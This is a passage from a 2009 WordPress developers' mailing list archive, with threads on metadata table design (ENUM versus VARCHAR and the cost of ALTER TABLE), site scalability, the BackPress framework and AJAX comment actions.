	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<4494FCAA-8E1E-465A-9543-DF459796DCA4@ftwr.co.uk>
	<4B300AD8.8080700@mullenweg.com>
	<4ede8f490912211617r2c0ff696i9bfc412b59f6434f@mail.gmail.com>
	<59e7f3130912220337u105f9035rf62a18150f7c20bf@mail.gmail.com>
Message-ID: <59e7f3130912220338o698791f2l1fd26bb26768beb9@mail.gmail.com>

2009/12/22 Malaiac <malaiac at gmail.com>:
> 2009/12/22 Vinicius Massuchetto <viniciusandre at gmail.com>:
>> I got impressed how WP Super Cache can deal with that, and in the end
>> the website had more than 2.000 visits a day with no overload at all.
>>
>
> there is no scalability issues to speak of before 10k visits a day.
> I ?work on two WP installs which often get more than 200k pages views
> per day. One of them is a very custom game website (10 pages, one of
> them get more than 50k views a day), the other a buzz/zeitgeist
> website with many embed videos, ads, etc.

I didn't mention that to brag about it (there is many WP installs that
are under much heavier load). Just to keep some order of magnitude in
mind.

M

From malaiac at gmail.com  Tue Dec 22 11:41:20 2009
From: malaiac at gmail.com (Malaiac)
Date: Tue, 22 Dec 2009 12:41:20 +0100
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <4B30AC3E.8030803@santosj.name>
References: <4B30AC3E.8030803@santosj.name>
Message-ID: <59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>

2009/12/22 Jacob Santos <wordpress at santosj.name>:
> id,
> object_type
> object_id
> key_name
> key_value
>
> Could easily replace the 3 tables that currently exist. Of course, it might
> seem slow that object_type would be varchar and usually a number index will
> be faster, but at this point, I'll rather go with anything.

if we're going in that direction, _PLEASE_ make object_type an ENUM
and not a VARCHAR. People who are going to use new objects types are
fluent enough to ALTER the ENUM.

From peter.westwood at ftwr.co.uk  Tue Dec 22 11:57:48 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue, 22 Dec 2009 11:57:48 +0000
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
Message-ID: <8738709A-9BD9-42A1-93EB-E01202419BBC@ftwr.co.uk>


On 22 Dec 2009, at 11:41, Malaiac wrote:

> 2009/12/22 Jacob Santos <wordpress at santosj.name>:
>> id,
>> object_type
>> object_id
>> key_name
>> key_value
>>
>> Could easily replace the 3 tables that currently exist. Of course,  
>> it might
>> seem slow that object_type would be varchar and usually a number  
>> index will
>> be faster, but at this point, I'll rather go with anything.

The current solution is scalable enough to support meta against any  
object type and the low level function do just that to allow a plugin  
to add a different sort of meta.

Migrating all the current meta into one table would cause an upgrade  
headache for sites which make a lot of use of the current postmeta and  
commentmeta tables migrating all that data would take time.

It would also break all plugins that did interesting things with meta  
using direct queries because they stored interesting data there.

>
> if we're going in that direction, _PLEASE_ make object_type an ENUM
> and not a VARCHAR. People who are going to use new objects types are
> fluent enough to ALTER the ENUM.


We don't use ENUM because it reduces DB portability as it is not a  
standard SQL datatype.

We specifically switched away from it to make it easier for people to  
write drop in replacements for wpdb which use other databases.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From mikeschinkel at newclarity.net  Tue Dec 22 12:23:08 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 22 Dec 2009 07:23:08 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <59e7f3130912220337u105f9035rf62a18150f7c20bf@mail.gmail.com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<4494FCAA-8E1E-465A-9543-DF459796DCA4@ftwr.co.uk>
	<4B300AD8.8080700@mullenweg.com>
	<4ede8f490912211617r2c0ff696i9bfc412b59f6434f@mail.gmail.com>
	<59e7f3130912220337u105f9035rf62a18150f7c20bf@mail.gmail.com>
Message-ID: <956D46B4-019D-4E11-A335-A79E45F66865@newclarity.net>

On Dec 22, 2009, at 6:37 AM, Malaiac wrote:
> there is no scalability issues to speak of before 10k visits a day.
> I  work on two WP installs which often get more than 200k pages views
> per day. One of them is a very custom game website (10 pages, one of
> them get more than 50k views a day), the other a buzz/zeitgeist
> website with many embed videos, ads, etc.

So we can compare apples-to-apples, I assume the page with 50k views is a page (or a post?)  Does it have any custom fields? If yes, how many?  Can you elaborate on what kind of data displayed on each page? (Care to share the URL? I'm asking not to make a point but because I'd like to understand WordPress scalability in real world scenarios.) 

-Mike Schinkel

From wordpress at santosj.name  Tue Dec 22 13:07:49 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Tue, 22 Dec 2009 07:07:49 -0600
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <8738709A-9BD9-42A1-93EB-E01202419BBC@ftwr.co.uk>
References: <4B30AC3E.8030803@santosj.name>	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
	<8738709A-9BD9-42A1-93EB-E01202419BBC@ftwr.co.uk>
Message-ID: <4B30C4A5.3000002@santosj.name>

So what you are saying is that I could have 5+ or worse case 20+ meta 
tables that all have similar structure. Hmm, I think views would fix 
some problems yes.

It is nice that there is at least some API for the new metadata, so that 
it can eventually be ported to a single table.

Jacob Santos

Peter Westwood wrote:
>
> On 22 Dec 2009, at 11:41, Malaiac wrote:
>
>> 2009/12/22 Jacob Santos <wordpress at santosj.name>:
>>> id,
>>> object_type
>>> object_id
>>> key_name
>>> key_value
>>>
>>> Could easily replace the 3 tables that currently exist. Of course, 
>>> it might
>>> seem slow that object_type would be varchar and usually a number 
>>> index will
>>> be faster, but at this point, I'll rather go with anything.
>
> The current solution is scalable enough to support meta against any 
> object type and the low level function do just that to allow a plugin 
> to add a different sort of meta.
>
> Migrating all the current meta into one table would cause an upgrade 
> headache for sites which make a lot of use of the current postmeta and 
> commentmeta tables migrating all that data would take time.
>
> It would also break all plugins that did interesting things with meta 
> using direct queries because they stored interesting data there.
>
>>
>> if we're going in that direction, _PLEASE_ make object_type an ENUM
>> and not a VARCHAR. People who are going to use new objects types are
>> fluent enough to ALTER the ENUM.
>
>
> We don't use ENUM because it reduces DB portability as it is not a 
> standard SQL datatype.
>
> We specifically switched away from it to make it easier for people to 
> write drop in replacements for wpdb which use other databases.
>
> Cheers

From jane at automattic.com  Tue Dec 22 13:59:32 2009
From: jane at automattic.com (Jane Wells)
Date: Tue, 22 Dec 2009 08:59:32 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <mailman.8617.1261481846.16651.wp-hackers@lists.automattic.com>
References: <mailman.8617.1261481846.16651.wp-hackers@lists.automattic.com>
Message-ID: <EF5D7949-1C27-4284-9E90-0939310A9366@automattic.com>

> From: Mike Schinkel <mikeschinkel at newclarity.net>
> I googled "BackPress" and found very little substantial.
>
> I did find this http://www.ohloh.net/p/backpress but this  
> "Decreasing year-over-year development activity" would scare me away  
> from it.  I'd be far more apt to use CakePHP or similar if I had to  
> abandon WordPress as a CMS framework.
Hi Mike. That site's analysis of "Decreasing year-over-year  
development activity" seems weird to me, since as far as I know, those  
common bits between WP and bbPress were only formalized into BackPress  
in the last year or so. I could be totally wrong, but I remember Sam  
Bauers working on it for integration between bbPress and BuddyPress,  
and Beau just put up a site recently. Try http://backpress.org/  
instead. Fledgling site still, but Beau Lebens loves BackPress, Matt  
loves BackPress, Westi loves BackPress, and it's integral to  some big  
projects, so I don't really see it going away as long as there's a  
WordPress.

> 2000 visits a day is one visit ever 43.2 seconds.  I *hope*  
> WordPress meta can handle that.
>
> How about 2000 visits a minute?  That's much harder.
WordPress.com gets more than ten times that per minute (I looked it  
up) and it does okay. :)

Jane

From scribu at gmail.com  Tue Dec 22 14:13:54 2009
From: scribu at gmail.com (scribu)
Date: Tue, 22 Dec 2009 16:13:54 +0200
Subject: [wp-hackers] XMAS greetings and a Thank You
In-Reply-To: <1261477291.5836.76.camel@robert-laptop>
References: <1261477291.5836.76.camel@robert-laptop>
Message-ID: <349fe48b0912220613k24d052b7q567148e34a1cd3ae@mail.gmail.com>

Probably the best seasons greetings message I read this year.

Thanks and merry Xmas to you too!


-- 
http://scribu.net

From scribu at gmail.com  Tue Dec 22 14:17:16 2009
From: scribu at gmail.com (scribu)
Date: Tue, 22 Dec 2009 16:17:16 +0200
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <4B30C4A5.3000002@santosj.name>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
	<8738709A-9BD9-42A1-93EB-E01202419BBC@ftwr.co.uk>
	<4B30C4A5.3000002@santosj.name>
Message-ID: <349fe48b0912220617x65440920x35f1ec3bd0a0dccd@mail.gmail.com>

To make sure no duplicates appear, here's the ticket that contains 2
versions of a patch for a single meta table: with and without ENUMs. Knock
yourselves out:

http://core.trac.wordpress.org/ticket/10487


-- 
http://scribu.net

From beau at dentedreality.com.au  Tue Dec 22 14:19:45 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Tue, 22 Dec 2009 11:19:45 -0300
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <EF5D7949-1C27-4284-9E90-0939310A9366@automattic.com>
References: <mailman.8617.1261481846.16651.wp-hackers@lists.automattic.com>
	<EF5D7949-1C27-4284-9E90-0939310A9366@automattic.com>
Message-ID: <902424490912220619t56de5af6je83d5b13ea94b1e7@mail.gmail.com>

> Hi Mike. That site's analysis of "Decreasing year-over-year development
> activity" seems weird to me, since as far as I know, those common bits
> between WP and bbPress were only formalized into BackPress in the last year
> or so. I could be totally wrong, but I remember Sam Bauers working on it for
> integration between bbPress and BuddyPress, and Beau just put up a site
> recently. Try http://backpress.org/ instead. Fledgling site still, but Beau
> Lebens loves BackPress, Matt loves BackPress, Westi loves BackPress, and
> it's integral to ?some big projects, so I don't really see it going away as
> long as there's a WordPress.

I literally put that site together a few days ago, so it doesn't have
much Google Juice yet, but I'm working on it. Going to try to post
something to my blog (http://dentedreality.com.au/) today, and
hopefully some other folks will start linking it up now that it
exists. Also going to get some links from current places that mention
BackPress to try to get things all pointing to one place so we can
"rally the troops" as they say, and drum up some interest in BackPress
as a "stand alone" project (not that it's stand alone, but it could
use a little love).

If anyone is interested in putting together any documentation they
feel that's missing, providing links to docs that already exist, think
BP needs some expansion in certain areas, can help with merges to/from
WordPress and bbPress code etc, please let me know I guess either via
this list for now, or via comments on that site!

Beau

From peter.westwood at ftwr.co.uk  Tue Dec 22 14:20:22 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue, 22 Dec 2009 14:20:22 +0000
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
Message-ID: <B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>


On 22 Dec 2009, at 01:56, Mike Schinkel wrote:
> On Dec 21, 2009, at 5:38 PM, Peter Westwood wrote:
>> In my personal opinion if I was designing a site which needed this  
>> kind of functionality I probably would not start with the WordPress  
>> platform to develop it.
>
> I understand that's a position many people take.  I take the  
> position that so much of what I need it already provided by  
> WordPress that it's crazy not to use it.
>
>> I would however start with the BackPress framework because of all  
>> the cool WordPress like functionality it provides like User  
>> Managment, DB abstraction, object caching etc and I can have  
>> whatever urls I want and optimise the database structure to make  
>> the queries zippy.
>
> I googled "BackPress" and found very little substantial.
>
> I did find this http://www.ohloh.net/p/backpress but this  
> "Decreasing year-over-year development activity" would scare me away  
> from it.

BackPress.org has more info.

The activity on BackPress has been decreasing partly because there  
isn't much that needs changing in it and partly because very few  
people know it exists.

There was a huge spike of activity at the beining of the projects life  
when all the code from WordPress was imported - the shared code hasn't  
changed that much since then so it is unlikely to have increasing  
activity by its very nature.

I am trying to keep the code in BackPress that is also in WordPress in  
sync so that one benifits to the fixes from the others.

>> I like to use the right tools for the job rather than fight against  
>> the one that doesn't do what I want how I want - I find it works  
>> better that way
>
> The "right tool for the job" is an illusive holy grail. Every tool  
> has tradeoffs; the tradeoffs that I value are different than the  
> ones you value.  I value that simplicity of WordPress architecture  
> and the vast support it has from 3rd party themes and plugins, 1000s  
> of articles on how to use it, and how nicely it does 90% of what I  
> need (it's that 10% I'm trying to get past.  But a year ago is was  
> only 85% of what I need so it's getting better.)
>

I know that every tool has its trade offs but it seems to me from a  
lot of what you have commented on about your issues with WordPress as  
a CMS you want to do things in such a radically different way that  
some of the higher level bits of WordPress get in the way some of the  
time.

BackPress gives you a framework to build your site from which doesn't  
preclude you using WordPress as well and using all those plugins and  
themes - it really comes down to what you are trying to build

>> If you have any BackPress questions then please let me know off  
>> list and I can point you in the right direction.
>
> Thanks for the offer.  I'd be interested if it were something a lot  
> of people were using and actively writing about.  If I am somehow  
> misunderstanding its role then I would be very interested in  
> learning more about it.

I know there isn't much being written about it.  A big part of that is  
that you don't necessarily know you are using it.  Everytime you use  
WordPress you are effectively using BackPress as it is a subset of the  
WordPress code.

There are currently two public projects using BackPress and a number  
of private/not yet public projects

I hope that helps answer some of your questions.

Peter
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From hempsworth at googlemail.com  Tue Dec 22 14:33:42 2009
From: hempsworth at googlemail.com (Alex Hempton-Smith)
Date: Tue, 22 Dec 2009 14:33:42 +0000
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com> 
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net> 
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com> 
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
Message-ID: <5a1dad880912220633o70aba54bx340cb68602c1cce9@mail.gmail.com>

>
> There are currently two public projects using BackPress and a number of
> private/not yet public projects
>

I imagine 'SupportPress' runs the support mechanism on wordpress.com, is
this planned to go public at any point?

-- Alex  (Hempsworth)

From beau at dentedreality.com.au  Tue Dec 22 15:25:12 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Tue, 22 Dec 2009 12:25:12 -0300
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <5a1dad880912220633o70aba54bx340cb68602c1cce9@mail.gmail.com>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
	<5a1dad880912220633o70aba54bx340cb68602c1cce9@mail.gmail.com>
Message-ID: <902424490912220725p2e1ff292na746b7ec5caa2f65@mail.gmail.com>

>> There are currently two public projects using BackPress and a number of
>> private/not yet public projects
>>
>
> I imagine 'SupportPress' runs the support mechanism on wordpress.com, is
> this planned to go public at any point?

SupportPress is a tool we (Automattic) use internally to run a certain
sub-set of our support systems (but it isn't actually used for
handling the bulk of wordpress.com support). Currently there are no
plans to release it (and it's not really in a releasable state ;) )

From joseph at josephscott.org  Tue Dec 22 16:49:29 2009
From: joseph at josephscott.org (Joseph Scott)
Date: Tue, 22 Dec 2009 09:49:29 -0700
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
Message-ID: <bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com>

On Tue, Dec 22, 2009 at 4:41 AM, Malaiac <malaiac at gmail.com> wrote:
> if we're going in that direction, _PLEASE_ make object_type an ENUM
> and not a VARCHAR. People who are going to use new objects types are
> fluent enough to ALTER the ENUM.


Please DON'T use ENUM.  Aside from the DB portability issues that
Peter brought up, ALTER TABLE in performance in MySQL can be pretty
bad.  MySQL does a full table copy for table ALTERations.  There are
very involved hacks to improve that process, but they aren't for the
average WP user.

Adding and removing object_type's should be easy, with minimal impact.
 Using ENUM is highly intrusive and high impact.


-- 
Joseph Scott
joseph at josephscott.org
http://josephscott.org/

From malaiac at gmail.com  Tue Dec 22 20:42:39 2009
From: malaiac at gmail.com (Malaiac)
Date: Tue, 22 Dec 2009 21:42:39 +0100
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
	<bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com>
Message-ID: <59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>

2009/12/22 Joseph Scott <joseph at josephscott.org>:
> Please DON'T use ENUM. ?Aside from the DB portability issues that
> Peter brought up, ALTER TABLE in performance in MySQL can be pretty
> bad. ?MySQL does a full table copy for table ALTERations. ?There are
> very involved hacks to improve that process, but they aren't for the
> average WP user.
>
> Adding and removing object_type's should be easy, with minimal impact.
> ?Using ENUM is highly intrusive and high impact.


See, you are focused on portability and one time performance of an
ALTER table. I'm focused on long term performance of heavily used meta
tables. No way I'm gonna suffer a VARCHAR search for each and every
meta. There are sites with more than 20 000 comments on a single page.
There are sites with more than 30 meta values per post. ...

M

From mikeschinkel at newclarity.net  Tue Dec 22 20:49:22 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 22 Dec 2009 15:49:22 -0500
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
	<bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com>
	<59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
Message-ID: <10015F42-EDDC-4639-B36F-D8A0541CB45D@newclarity.net>

On Dec 22, 2009, at 3:42 PM, Malaiac wrote:
> 2009/12/22 Joseph Scott <joseph at josephscott.org>:
>> Please DON'T use ENUM.  Aside from the DB portability issues that
>> Peter brought up, ALTER TABLE in performance in MySQL can be pretty
>> bad.  MySQL does a full table copy for table ALTERations.  There are
>> very involved hacks to improve that process, but they aren't for the
>> average WP user.
>> 
>> Adding and removing object_type's should be easy, with minimal impact.
>>  Using ENUM is highly intrusive and high impact.
> 
> See, you are focused on portability and one time performance of an
> ALTER table. I'm focused on long term performance of heavily used meta
> tables. No way I'm gonna suffer a VARCHAR search for each and every
> meta. There are sites with more than 20 000 comments on a single page.
> There are sites with more than 30 meta values per post. ...

I'd agree withthe  long term vs. one time concern.  

-Mike Schinkel






From otto at ottodestruct.com  Tue Dec 22 21:05:02 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 22 Dec 2009 15:05:02 -0600
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com> 
	<bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com> 
	<59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
Message-ID: <161617690912221305g50c3ddd9rd7082d835fbe4123@mail.gmail.com>

On Tue, Dec 22, 2009 at 2:42 PM, Malaiac <malaiac at gmail.com> wrote:
> See, you are focused on portability and one time performance of an
> ALTER table. I'm focused on long term performance of heavily used meta
> tables. No way I'm gonna suffer a VARCHAR search for each and every
> meta. There are sites with more than 20 000 comments on a single page.
> There are sites with more than 30 meta values per post. ...

And those sites are not the norm, and so should be using customized
solutions to solve their specific needs.

If a site has 30 meta values per post and is using them extensively,
then they are doing it wrong. They should be using some form of plugin
with a custom table to handle their needs.

If a site has 20000 comments on a single page, then they are doing it
wrong. They should be using some kind of forum software, or perhaps
"paging" of their comments.

WordPress should not be developing core code to fill the needs of the
tip of the long tail.

-Otto

From otto at ottodestruct.com  Tue Dec 22 21:08:59 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 22 Dec 2009 15:08:59 -0600
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com> 
	<bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com> 
	<59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
Message-ID: <161617690912221308q5ff37e55vccb06aa5b97f72b2@mail.gmail.com>

On Tue, Dec 22, 2009 at 2:42 PM, Malaiac <malaiac at gmail.com> wrote:
> See, you are focused on portability and one time performance of...

Almost forgot, the "ALTER" is not a one time thing. If you use enums,
then every time you add a new meta type, your table gets altered.
ENUM's are enumerated, meaning that they're pre-defined. You can't add
new ones on the fly, which is sorta the whole point behind meta.

That was what he was talking about. Use of ENUMs is a major
performance drain for most sites (you know, the ones which aren't
using 30 metas on each post and 20k comments on every page).

-Otto
Sent from Memphis, TN, United States

From mikeschinkel at newclarity.net  Tue Dec 22 21:09:40 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 22 Dec 2009 16:09:40 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <EF5D7949-1C27-4284-9E90-0939310A9366@automattic.com>
References: <mailman.8617.1261481846.16651.wp-hackers@lists.automattic.com>
	<EF5D7949-1C27-4284-9E90-0939310A9366@automattic.com>
Message-ID: <3A428306-713A-463D-A1F4-BEDFC942115C@newclarity.net>

On Dec 22, 2009, at 8:59 AM, Jane Wells wrote:
> Try http://backpress.org/ instead. Fledgling site still, but Beau Lebens loves BackPress, Matt loves BackPress, Westi loves BackPress, and it's integral to  some big projects, so I don't really see it going away as long as there's a WordPress.

Thanks for the link.  

One thing I struggle with communicating in developer forums is that the first and most important thing I look for in adopting technology is not  how technically good it is but how many people are actively using it, writing about it, building 3rd party solutions for it and so on. For many developers on mailing lists that's often not even an important consideration but it determines so many things about viability and real world usefulness.  For anyone who has read crossing the Chasm by Geoffrey Moore will understand it that I'm in the "early majority" when it comes to how I evaluate technology whereas most developers are in the "innovator" category.

So whereas a developer might use something because they like it's tech it still doesn't work for me if it is obscure.  This is a conflict in values, which is why debates like this as so often like a religious war.

That said, it BackPress going to be used as the foundation for a future WordPress?  THAT would get my interest flowing.

>> 2000 visits a day is one visit ever 43.2 seconds.  I *hope* WordPress meta can handle that.
>> 
>> How about 2000 visits a minute?  That's much harder.
> WordPress.com gets more than ten times that per minute (I looked it up) and it does okay. :)

Yes, but WordPress.com is used as a blog not as a CMS.  :)

-Mike Schinkel



From joseph at josephscott.org  Tue Dec 22 21:55:03 2009
From: joseph at josephscott.org (Joseph Scott)
Date: Tue, 22 Dec 2009 14:55:03 -0700
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com> 
	<bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com> 
	<59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
Message-ID: <bbd639f50912221355r27202a2gbf7bb29d283674f5@mail.gmail.com>

On Tue, Dec 22, 2009 at 1:42 PM, Malaiac <malaiac at gmail.com> wrote:
> See, you are focused on portability and one time performance of an
> ALTER table. I'm focused on long term performance of heavily used meta
> tables. No way I'm gonna suffer a VARCHAR search for each and every
> meta. There are sites with more than 20 000 comments on a single page.
> There are sites with more than 30 meta values per post. ...

That's exactly a case where you don't want to use ENUMs.  Doing an
ALTER table with a large data set is not going to be fast.  What you
are trying gain in a little bit of extra performance is costing your
big time in flexibility.

Adding a new type is not a one time thing, plugins and themes will
bring along their own types as well. I don't think people running
large sites will be too thrilled when activating a plugin takes 20
minutes and takes the rest of the site down with it because MySQL is
busy copying the table because of one ALTER table command.  Now
imagine going throw that for any theme or plugin that wants to add a
new type.

There are lots of ways to make a page faster, and if you are big site
then caching is likely to be part of your future.

-- 
Joseph Scott
joseph at josephscott.org
http://josephscott.org/

From ravi-lists at g8o.net  Tue Dec 22 22:37:58 2009
From: ravi-lists at g8o.net ( ravi )
Date: Tue, 22 Dec 2009 17:37:58 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <90F94996-130F-4CA3-A9FB-21C00D0017E9@g8o.net>

On Dec 11, 2009, at 3:37 PM, Matt Mullenweg wrote:
> What do you wish you had when you first started developing for  
> WordPress?
>
> (Bonus points if it's something that already exists, just scattered  
> around. :))


But that's what I wish I had: things that exist but that aren't so  
scattered around ;-). The Codex actually is pretty helpful, if you  
read through and follow required reading recommendations. There are  
things that do not exist, such as documentation for certain functions,  
hooks/filters (I think, though I should probably first find an example  
before shooting my mouth off).

There are some things that just take time if I want to do them the  
right way... like right now, I am trying to figure out how some of the  
Comment Administration actions seem to respond AJAXily (e.g: approve/ 
unapprove) and I am not at all sure how that's done. I want to add  
some additional comment actions (which act via AJAX) and I can code  
all that up quickly if I just implemented the AJAX query/response for  
those actions (using jQuery perhaps, with clues from the corresponding  
Codex page). But perhaps I am overworking? Outside of asking on wp- 
hackers, is there a document that will tell me? (so far, I don't know  
the answer after looking at some of the AJAX and admin plugins related  
Codex pages).

	--ravi


From scribu at gmail.com  Tue Dec 22 22:56:30 2009
From: scribu at gmail.com (scribu)
Date: Wed, 23 Dec 2009 00:56:30 +0200
Subject: [wp-hackers] Developer portal
In-Reply-To: <90F94996-130F-4CA3-A9FB-21C00D0017E9@g8o.net>
References: <4B22AD95.8040401@mullenweg.com>
	<90F94996-130F-4CA3-A9FB-21C00D0017E9@g8o.net>
Message-ID: <349fe48b0912221456r6cfba522g91ed36953640e9a@mail.gmail.com>

On Wed, Dec 23, 2009 at 12:37 AM, [ ravi ] <ravi-lists at g8o.net> wrote:

> There are some things that just take time if I want to do them the right
> way... like right now, I am trying to figure out how some of the Comment
> Administration actions seem to respond AJAXily (e.g: approve/unapprove) and
> I am not at all sure how that's done. I want to add some additional comment
> actions (which act via AJAX) and I can code all that up quickly if I just
> implemented the AJAX query/response for those actions (using jQuery perhaps,
> with clues from the corresponding Codex page). But perhaps I am overworking?
> Outside of asking on wp-hackers, is there a document that will tell me? (so
> far, I don't know the answer after looking at some of the AJAX and admin
> plugins related Codex pages).
>

No, there isn't a tutorial that will tell you how the AJAXy action links for
comments work. But you have something much more valuable at your disposal:
the entire source code.

I'm not suggesting that a tutorial wouldn't help, just that at that level of
detail, looking at the code is a much faster way to learn how stuff works.
(Btw, using the Firebug console to follow AJAX requests is priceless.)


-- 
http://scribu.net

From wordpress at santosj.name  Wed Dec 23 01:04:09 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Tue, 22 Dec 2009 19:04:09 -0600
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <bbd639f50912221355r27202a2gbf7bb29d283674f5@mail.gmail.com>
References: <4B30AC3E.8030803@santosj.name>	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
	<bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com>
	<59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
	<bbd639f50912221355r27202a2gbf7bb29d283674f5@mail.gmail.com>
Message-ID: <4B316C89.2080100@santosj.name>

So, is this part of the reason it hasn't been added to core? The endless 
bikesheding. If you are fine with it scribu, I hope to use your patch 
with a project I'm going to be doing in a few weeks. Hopefully, with the 
extra real world usage of the API a few problems that people have will 
be resolved. I'll  probably be experimenting as well.

Hopefully, this can be resolved by 3.0 or 3.1.

Jacob Santos

From mikeschinkel at newclarity.net  Wed Dec 23 04:32:58 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 22 Dec 2009 23:32:58 -0500
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <161617690912221308q5ff37e55vccb06aa5b97f72b2@mail.gmail.com>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
	<bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com>
	<59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
	<161617690912221308q5ff37e55vccb06aa5b97f72b2@mail.gmail.com>
Message-ID: <AC6467C4-6871-41B9-99DF-BC4560495CD0@newclarity.net>

On Dec 22, 2009, at 4:08 PM, Otto wrote:
